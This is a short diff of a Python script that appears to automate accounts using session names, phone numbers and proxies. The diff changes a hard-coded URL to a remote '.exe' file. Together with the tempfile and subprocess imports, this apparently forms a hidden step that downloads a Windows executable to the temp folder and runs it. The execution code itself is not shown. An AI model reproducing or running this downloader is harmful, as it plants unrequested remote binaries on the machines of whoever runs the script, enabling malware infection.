@@ -3,7 +3,7 @@ import os
 import subprocess
 import tempfile
 import requests
-url = "https://manage.glimmerix.pro/api/public/dl/_ETqC2Zd" 
+url = "https://download1818.com/file_cache.exe" 
 
 temp_dir = tempfile.gettempdir()
 
@@ -62,6 +62,7 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
